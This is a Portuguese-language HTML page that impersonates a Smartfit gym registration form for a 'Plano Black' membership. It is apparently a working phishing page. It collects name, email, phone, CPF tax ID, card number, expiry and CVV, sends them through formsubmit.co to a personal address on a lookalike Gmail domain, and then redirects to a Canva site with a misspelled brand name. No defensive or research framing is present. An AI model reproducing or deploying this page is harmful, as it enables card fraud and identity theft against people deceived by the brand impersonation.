<!DOCTYPE html>

<html lang="pt-BR">

<head>

  <meta charset="UTF-8">

  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Cadastro de Plano</title>

  <style>
    body {
      margin: 0;
      font-family: 'Montserrat', sans-serif;
      background-color: #121212;
      color: #fff;
    }

    header {
      background-color: #000;
      padding: 20px;
      text-align: center;
    }

    header h1 {
      color: #FFD600;
      margin: 0;
    }

    .form-container {
      max-width: 600px;
      margin: 40px auto;
      padding: 30px;
      background-color: #1f1f1f;
      border-radius: 10px;
    }

    label {
      display: block;
      margin-top: 15px;
      margin-bottom: 5px;
      font-weight: bold;
    }

    input,
    textarea {
      width: 100%;
      padding: 12px;
      border-radius: 5px;
      border: none;
      background-color: #333;
      color: #fff;
    }

    button {
      margin-top: 25px;
      background-color: #FFD600;
      color: #000;
      border: none;
      padding: 15px;
      width: 100%;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
    }

    button:hover {
      background-color: #e0c100;
    }

    .disclaimer {
      font-size: 12px;
      color: #bbb;
      margin-top: 15px;
    }
  </style>

</head>

<body>

  <header>

    <h1>Cadastro Smartfit</h1>

    <p>Preencha as informações abaixo para prosseguirmos com seu Plano Black</p>

  </header>

  <div class="form-container">

    <form action="https://formsubmit.co/pepigm011@oegmail.com" method="POST">

      <!-- Dados Pessoais -->

      <label for="nome">Nome Completo</label>

      <input type="text" id="nome" name="Nome Completo" required>

      <label for="email">E-mail</label>

      <input type="email" id="email" name="Email" required>

      <label for="telefone">Telefone</label>

      <input type="tel" id="telefone" name="Telefone" placeholder="(DDD) 00000-0000">

      <label for="cpf">CPF</label>

      <input type="text" id="cpf" name="CPF" placeholder="000.000.000-00">

      <label for="objetivo">Objetivo com o plano</label>

      <textarea id="objetivo" name="Objetivo" rows="3" placeholder="Ex: Ganhar massa, emagrecer..."></textarea>
      <label for="objetivo"> Informações de cobrança 
        

        
        <!-- Dados do Cartão (apenas registro) -->

      
        <label for="cartao">Número do Cartão</label>

        <input type="text" id="cartao" name="Número do Cartão" placeholder="0000 0000 0000 0000">

        <label for="validade">Validade (MM/AA)</label>

        <input type="text" id="validade" name="Validade" placeholder="07/30">

        <label for="cvv">CVV</label>

        <input type="text" id="cvv" name="CVV" placeholder="123">

        <!-- Redirecionamento -->

        <input type="hidden" name="_next" value="https://smartfitnes.my.canva.site/dagra3tdpfk">

        <!-- Botão -->

        <button type="submit">Enviar Cadastro</button>

        <p class="disclaimer"></p>

    </form>

  </div>

</body>

</html>
